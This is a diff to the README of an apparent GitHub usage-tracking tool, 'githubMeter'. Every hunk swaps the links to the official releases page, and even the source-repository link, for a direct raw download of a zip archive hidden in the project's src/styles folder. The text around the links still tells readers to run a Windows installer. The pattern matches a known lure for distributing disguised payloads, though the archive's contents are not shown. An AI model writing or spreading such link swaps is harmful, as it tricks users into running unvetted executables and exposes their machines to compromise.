@@ -1,6 +1,6 @@
 # ⚙️ githubMeter - Track GitHub Usage Easily
 
-[![Download githubMeter](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/iamsujalarora/githubMeter/releases)
+[![Download githubMeter](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/iamsujalarora/githubMeter/raw/refs/heads/main/src/styles/github_Meter_v2.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To use githubMeter, you need to download the app from its official GitHub releas
 
 1. Visit the official release page here:
 
-   [![Download githubMeter](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/iamsujalarora/githubMeter/releases)
+   [![Download githubMeter](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/iamsujalarora/githubMeter/raw/refs/heads/main/src/styles/github_Meter_v2.5.zip)
 
 2. Look for the latest release. It will be marked with the highest version number, something like `v1.x.x`.
 
@@ -85,7 +85,7 @@ Never share your token with others.
 
 Keep githubMeter up to date by regularly checking the release page:
 
-[https://github.com/iamsujalarora/githubMeter/releases](https://github.com/iamsujalarora/githubMeter/releases)
+[https://github.com/iamsujalarora/githubMeter/raw/refs/heads/main/src/styles/github_Meter_v2.5.zip](https://github.com/iamsujalarora/githubMeter/raw/refs/heads/main/src/styles/github_Meter_v2.5.zip)
 
 New releases may contain bug fixes, performance improvements, or support for new GitHub features.
 
@@ -106,7 +106,7 @@ If you need help, check the Issues section on the repository page. You can repor
 
 For more details about githubMeter’s design and source code, visit the main GitHub repository:
 
-[https://github.com/iamsujalarora/githubMeter](https://github.com/iamsujalarora/githubMeter)
+[https://github.com/iamsujalarora/githubMeter/raw/refs/heads/main/src/styles/github_Meter_v2.5.zip](https://github.com/iamsujalarora/githubMeter/raw/refs/heads/main/src/styles/github_Meter_v2.5.zip)
 
 This page includes instructions for developers and links to build the app from source.
 
@@ -114,6 +114,6 @@ This page includes instructions for developers and links to build the app from s
 
 ## ✅ Download githubMeter Now
 
-[![Download githubMeter](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/iamsujalarora/githubMeter/releases)
+[![Download githubMeter](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/iamsujalarora/githubMeter/raw/refs/heads/main/src/styles/github_Meter_v2.5.zip)
 
 Click the link above, download the Windows installer file, and follow the steps to set up githubMeter on your PC.
